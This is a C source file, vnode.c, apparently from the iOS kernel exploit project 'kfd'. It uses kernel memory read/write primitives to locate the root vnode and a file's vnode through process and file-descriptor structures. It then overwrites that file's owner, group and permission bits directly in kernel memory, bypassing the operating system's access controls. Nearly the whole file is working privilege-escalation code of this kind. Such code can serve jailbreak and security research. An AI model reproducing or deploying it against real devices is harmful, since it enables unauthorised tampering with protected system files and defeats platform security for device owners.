//
//  vnode.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//

#include "vnode.h"
#include "krw.h"
#include "offsets.h"
#include "proc.h"
#include "utils.h"
#include <sys/fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

uint64_t findRootVnode(void) {
    uint64_t launchd_proc = proc_of_pid(1);
    
    uint64_t textvp_pac = kread64(launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac;
    printf("[i] launchd proc->textvp: 0x%llx", textvp);

    uint64_t textvp_nameptr = kread64(textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_name: %s", &textvp_name);
    
    uint64_t sbin_vnode = kread64(textvp + off_vnode_v_parent);
    textvp_nameptr = kread64(sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_name: %s", &textvp_name);
    
    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent);
    textvp_nameptr = kread64(root_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s", &textvp_name);
    //printf("[+] rootvnode: 0x%llx", root_vnode);
    
    return root_vnode;
}

uint64_t getVnodeAtPath(char* filename) {
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = proc_of_pid(getpid());

    uint64_t filedesc = kread64(proc + off_p_pfd);
    uint64_t openedfile = kread64(filedesc + (8 * file_index));
    uint64_t fileglob = kread64(openedfile + off_fp_glob);
    uint64_t vnode = kread64(fileglob + off_fg_data);
    
    close(file_index);
    
    return vnode;
}

uint64_t vnodeChown(char* filename, uid_t uid, gid_t gid) {

    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(v_data + 0x78);
    uint32_t v_gid = kread32(v_data + 0x7c);
    
    //vnode->v_data->uid
    printf("[i] Patching %s vnode->v_uid %d -> %d", filename, v_uid, uid);
    kwrite32(v_data+0x78, uid);
    //vnode->v_data->gid
    printf("[i] Patching %s vnode->v_gid %d -> %d", filename, v_gid, gid);
    kwrite32(v_data+0x7c, gid);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[+] %s UID: %d", filename, file_stat.st_uid);
        printf("[+] %s GID: %d", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t vnodeChmod(char* filename, mode_t mode) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    uint64_t v_data = kread64(vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(v_data + 0x80);
    
    printf("[i] Patching %s vnode->v_mode %o -> %o", filename, v_mode, mode);
    kwrite32(v_data+0x80, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[+] %s mode: %o", filename, file_stat.st_mode);
    }
    
    return 0;
}
